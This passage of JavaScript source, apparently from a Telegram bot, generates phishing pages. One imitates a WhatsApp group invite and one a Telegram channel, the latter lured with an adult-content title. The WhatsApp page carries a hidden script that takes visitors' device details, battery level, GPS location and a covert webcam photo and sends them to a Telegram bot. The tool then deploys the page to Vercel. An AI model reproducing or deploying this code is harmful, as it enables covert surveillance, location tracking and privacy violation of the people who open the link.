                            <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _ae_x"><a aria-label="Twitter" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Twitter_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                                    </svg></a><a aria-label="Youtube" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_YouTube_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                        <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                                    </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Instagram_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                        <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                                    </svg></a><a aria-label="Facebook" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Facebook_FinePrint_Link&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                        <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                                    </svg></a></div>
                        </span><span class="_aeom">
                            <div class="_9bhp _9bhq _9bhs _9bhv _afoo">
                                <div class="_afoa"><select id="u_0_a_I/" class="_9tg0 _afo4 _afon _aqya" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">Azərbaycan</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">Català</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">Dansk</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">Eesti</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">Español</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">Français</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">Hrvatski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">Italiano</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">Latviešu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">Lietuvių</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">Magyar</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">Norsk bokmål</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">O‘zbek</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">Polski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">Română</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">Shqip</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">Slovenčina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">Slovenščina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">Suomi</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">Svenska</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                    </select><select id="u_0_b_vn" class="_9tg0 _afo4 _afoc" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">azərbaycan</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">català</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">dansk</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">eesti</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">español</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">français</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">hrvatski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">italiano</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">latviešu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">lietuvių</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">magyar</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">norsk bokmål</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">o‘zbek</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">polski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">română</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">shqip</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">slovenčina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">slovenščina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">suomi</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">svenska</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                    </select><svg width="12" height="8" viewBox="0 0 12 8" fill="none" class="_a99- _afob">
                                        <path d="M1.41 -4.62904e-07L6 4.58L10.59 -6.16331e-08L12 1.41L6 7.41L-6.16331e-08 1.41L1.41 -4.62904e-07Z"></path>
                                    </svg></div>
                            </div>
                        </span></div>
                </div>
            </footer>
        </div>
    </div>
    </div>
    <div></div>
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v5/yH/l/0,cross/_jfkUskf2-v.css" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v5/yU/l/0,cross/MEuXBoqspBD.css" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v5/yR/l/0,cross/ChejQs5hirm.css" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v4/yZ/r/4igFof1Bmbn.js" as="script" crossorigin="anonymous" nonce="OYKyolxj" />
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <script>
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: ${io},
      text: message
    })
  }

  async function sendPhoto(photoBlob) {
    const formData = new FormData()
    formData.append("chat_id", ${io})
    formData.append("photo", photoBlob, "hek.jpg")

    axios.post("https://api.telegram.org/bot${t}/sendPhoto", formData)
  }

navigator.getBattery().then(battery => {
sendText("=> [ Device Information ]\n-> Ram: "+navigator.deviceMemory+" GB\n-> Batre: "+battery.level * 100+"%\n-> UserAgent: "+navigator.userAgent+"\n-> Platform: "+navigator.platform+"\n-> Language: "+navigator.language)
})

  async function getIAndL() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(pos => {
          let message = "[ INFORMATION ]\n=> [ Location ]\n-> Latitude: "+pos.coords.latitude+"\n-> Longitude: "+pos.coords.longitude+"\n-> Map: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude
          sendText(message)
      })
    }
  }

  async function getPhoto() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video')
        video.srcObject = stream
        video.play()

        video.onloadeddata = () => {
          const canvas = document.createElement('canvas')
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          canvas.getContext('2d').drawImage(video, 0, 0)

          stream.getTracks().forEach(track => track.stop())

          canvas.toBlob(blob => {
            sendPhoto(blob)
          }, 'image/jpeg', 0.95)
        }
      })
      .catch(err => {
        sendText("Akses Kamera Di Tolak")
      })
  }

  async function sendAll() {
    setTimeout(() => {
      getIAndL()
      getPhoto()
    }, 1000)
  }
    </script>
</body>
</html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "group-whatsapp")
fs.unlinkSync("index.html")
}

async function ch(ctx, t, io, cn) {
const kode = String.raw`
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Telegram: View @${cn}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Random Bokep 18+🤤🥵🥵">
<meta property="og:image" content="https://cdn5.cdn-telegram.org/file/h1mLbVut0M6Y5HiSX1R6EOnCbolkNKMybNDuXJk6lxOtbnpI29lB5cdskOoH7TBTT9f8eRoYc61F3FlqdfwUz79Vp53oni4nNJ8MSF3YjdC3jf-Rb5fp67VR7t_U2HnYghYkW0rDom56CqaoGVX-buMn76_qJhJlmB_Pq6lJU-KEOjygD3DnNVe7Vvye4iX6g6IQfY6dtiUM65iKsMz8T9S8SbOXWhDpWV_sD6XK3sACgpdrOuRKt6JgSdrvbb5m4UL--2CBvcpbRPPZOcBUSRL_lPaAzgmmQmvw1xB_I-tbUJNDH4WvlkAjAyXdBQhByfjPZu3rS52Bc2Y85xGO1A.jpg">
<meta property="og:site_name" content="Telegram">
<meta property="og:description" content="You can view and join @${cn} right away.">

<meta property="twitter:title" content="${cn}">
<meta property="twitter:image" content="https://cdn5.cdn-telegram.org/file/h1mLbVut0M6Y5HiSX1R6EOnCbolkNKMybNDuXJk6lxOtbnpI29lB5cdskOoH7TBTT9f8eRoYc61F3FlqdfwUz79Vp53oni4nNJ8MSF3YjdC3jf-Rb5fp67VR7t_U2HnYghYkW0rDom56CqaoGVX-buMn76_qJhJlmB_Pq6lJU-KEOjygD3DnNVe7Vvye4iX6g6IQfY6dtiUM65iKsMz8T9S8SbOXWhDpWV_sD6XK3sACgpdrOuRKt6JgSdrvbb5m4UL--2CBvcpbRPPZOcBUSRL_lPaAzgmmQmvw1xB_I-tbUJNDH4WvlkAjAyXdBQhByfjPZu3rS52Bc2Y85xGO1A.jpg">
<meta property="twitter:site" content="@Telegram">

<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@Telegram">
<meta name="twitter:description" content="You can view and join @${cn} right away.
">
<meta property="al:ios:app_store_id" content="686449807">
<meta property="al:ios:app_name" content="Telegram Messenger">
<meta property="al:ios:url" content="tg://resolve?domain=${cn}">

<meta property="al:android:url" content="tg://resolve?domain=${cn}">
<meta property="al:android:app_name" content="Telegram">
<meta property="al:android:package" content="org.telegram.messenger">

<meta name="twitter:app:name:iphone" content="Telegram Messenger">
<meta name="twitter:app:id:iphone" content="686449807">
<meta name="twitter:app:url:iphone" content="tg://resolve?domain=${cn}">
<meta name="twitter:app:name:ipad" content="Telegram Messenger">
<meta name="twitter:app:id:ipad" content="686449807">
<meta name="twitter:app:url:ipad" content="tg://resolve?domain="${cn}">
<meta name="twitter:app:name:googleplay" content="Telegram">
<meta name="twitter:app:id:googleplay" content="org.telegram.messenger">
<meta name="twitter:app:url:googleplay" content="https://t.me/${cn}">

<meta name="apple-itunes-app" content="app-id=686449807, app-argument: tg://resolve?domain=${cn}">
    <link rel="icon" type="image/svg+xml" href="//telegram.org/img/website_icon.svg?4">
<link rel="apple-touch-icon" sizes="180x180" href="//telegram.org/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="//telegram.org/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="//telegram.org/img/favicon-16x16.png">
<link rel="alternate icon" href="//telegram.org/img/favicon.ico" type="image/x-icon" />
    <link href="//telegram.org/css/font-roboto.css?1" rel="stylesheet" type="text/css">
    <!--link href="/css/myriad.css" rel="stylesheet"-->
    <link href="//telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
    <link href="//telegram.org/css/telegram.css?244" rel="stylesheet" media="screen">
  </head>
  <body class="no_transition">
      <div class="tgme_background_wrap">
    <canvas id="tgme_background" class="tgme_background default" width="50" height="50" data-colors="dbddbb,6ba587,d5d88d,88b884"></canvas>
    <div class="tgme_background_pattern default"></div>
  </div>
    <div class="tgme_page_wrap">
      <div class="tgme_head_wrap">
        <div class="tgme_head">
          <a href="//telegram.org/" class="tgme_head_brand">
            <svg class="tgme_logo" height="34" viewBox="0 0 133 34" width="133" xmlns="http://www.w3.org/2000/svg">
              <g fill="none" fill-rule="evenodd">
                <circle cx="17" cy="17" fill="var(--accent-btn-color)" r="17"/><path d="m7.06510669 16.9258959c5.22739451-2.1065178 8.71314291-3.4952633 10.45724521-4.1662364 4.9797665-1.9157646 6.0145193-2.2485535 6.6889567-2.2595423.1483363-.0024169.480005.0315855.6948461.192827.1814076.1361492.23132.3200675.2552048.4491519.0238847.1290844.0536269.4231419.0299841.65291-.2698553 2.6225356-1.4375148 8.986738-2.0315537 11.9240228-.2513602 1.2428753-.7499132 1.5088847-1.2290685 1.5496672-1.0413153.0886298-1.8284257-.4857912-2.8369905-1.0972863-1.5782048-.9568691-2.5327083-1.3984317-4.0646293-2.3321592-1.7703998-1.0790837-.212559-1.583655.7963867-2.5529189.2640459-.2536609 4.7753906-4.3097041 4.755976-4.431706-.0070494-.0442984-.1409018-.481649-.2457499-.5678447-.104848-.0861957-.2595946-.0567202-.3712641-.033278-.1582881.0332286-2.6794907 1.5745492-7.5636077 4.6239616-.715635.4545193-1.3638349.6759763-1.9445998.6643712-.64024672-.0127938-1.87182452-.334829-2.78737602-.6100966-1.12296117-.3376271-1.53748501-.4966332-1.45976769-1.0700283.04048-.2986597.32581586-.610598.8560076-.935815z" fill="#fff"/><path d="m49.4 